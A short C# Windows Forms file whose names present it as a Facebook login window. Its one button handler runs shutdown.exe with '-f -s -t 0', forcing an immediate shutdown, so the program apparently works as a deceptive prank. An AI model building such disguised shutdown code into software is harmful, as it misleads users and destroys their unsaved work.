using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace FacebookGiriş
{
    public partial class GizliPencere : Form
    {
        public GizliPencere()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "C:\\Windows\\system32\\shutdown.exe";
            psi.Arguments = "-f -s -t 0";
            Process.Start(psi);
        }
    }
}
